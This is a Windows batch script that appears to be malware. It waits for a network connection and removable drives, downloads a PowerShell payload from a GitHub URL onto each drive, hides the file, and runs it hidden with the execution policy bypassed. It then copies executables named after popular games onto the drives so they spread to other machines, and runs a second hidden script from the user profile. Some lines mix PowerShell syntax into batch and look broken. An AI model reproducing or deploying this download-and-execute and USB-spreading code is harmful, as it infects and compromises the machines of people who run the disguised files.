@echo off

$desktopPath = [System.Environment]::GetFolderPath("Desktop")

:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 300 >nul
    goto check_internet
)

:check_drive

set timeout_period=30
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        goto Yes
    )
)

timeout /t 300 >nul
goto check_drive

:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        timeout /t 240 >nul

        powershell powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\wYytnosVxfzD.ps1'"

        attrib +h "%%d:\wYytnosVxfzD.ps1"

        powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "%%d:\wYytnosVxfzD.ps1"

        set timeout_period = 30
       
        copy "$desktopPath/AssassinsCreed.exe" "%%d:\AssassinsCreed.exe"
        copy "$desktopPath/Fifa-Ps5.exe" "%%d:\Fifa-Ps5.exe"
        copy "$desktopPath/gta5-ps5.exe" "%%d:\gta5-ps5.exe"
    )
)

timeout /t 3600 /nobreak >nul
powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Program Data/Microsoft/Windows/AEQKCPrkuifY.ps1"

@end
exit
